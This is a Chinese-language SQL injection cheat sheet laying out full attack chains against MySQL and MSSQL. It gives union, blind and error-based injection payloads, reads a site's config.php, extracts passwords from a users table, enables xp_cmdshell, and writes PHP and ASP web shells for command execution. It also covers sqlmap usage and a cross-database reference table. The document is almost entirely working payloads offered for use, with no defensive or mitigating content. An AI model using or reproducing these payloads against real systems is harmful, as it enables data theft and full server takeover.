# SQL注入攻击链

## MySQL注入完整利用链

### 基础探测 → 获取Shell

```
1. 探测注入点
   ' OR '1'='1

2. 确定列数
   ' ORDER BY 1--
   ' ORDER BY 2-- (报错则列数为2)

3. 确定显示位置
   ' UNION SELECT 1,2,3--

4. 获取数据库信息
   ' UNION SELECT 1,database(),version()--

5. 获取网站绝对路径
   ' UNION SELECT 1,@@basedir,load_file('/var/www/html/config.php')--

6. 写入WebShell
   ' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--

7. 执行命令
   http://target/shell.php?cmd=whoami
```

### 盲注 → 获取数据

```
1. 确认盲注
   ' AND 1=1-- (正常)
   ' AND 1=2-- (异常)

2. 获取数据库名长度
   ' AND LENGTH(database())=4--

3. 逐字符提取
   ' AND ASCII(SUBSTRING(database(),1,1))=97--

4. 使用sqlmap自动化
   sqlmap -u "http://target?id=1" --dbs
```

### 报错注入 → 快速提取

```
1. 确认报错注入
   ' AND extractvalue(1,concat(0x7e,version()))--

2. 获取数据库
   ' AND extractvalue(1,concat(0x7e,database()))--

3. 获取表名
   ' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

4. 获取数据
   ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```

---

## MSSQL注入完整利用链

### 基础 → xp_cmdshell

```
1. 探测注入点
   ' OR 1=1--

2. 获取版本
   ' UNION SELECT 1,@@version,3--

3. 检测xp_cmdshell
   '; EXEC master..xp_cmdshell 'whoami'--

4. 开启xp_cmdshell
   '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

5. 执行命令
   '; EXEC master..xp_cmdshell 'whoami'--

6. 写入WebShell
   '; EXEC master..xp_cmdshell 'echo ^<%eval(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
```

---

## 攻击链速查表

| 阶段 | MySQL | MSSQL | PostgreSQL | Oracle |
|------|-------|-------|------------|--------|
| 探测 | `' OR '1'='1` | `' OR 1=1--` | `' OR 1=1--` | `' OR 1=1--` |
| 列数 | ORDER BY N | ORDER BY N | ORDER BY N | UNION NULL |
| 信息 | database() | @@version | version() | v$version |
| 写文件 | INTO OUTFILE | xp_cmdshell | COPY TO | UTL_FILE |
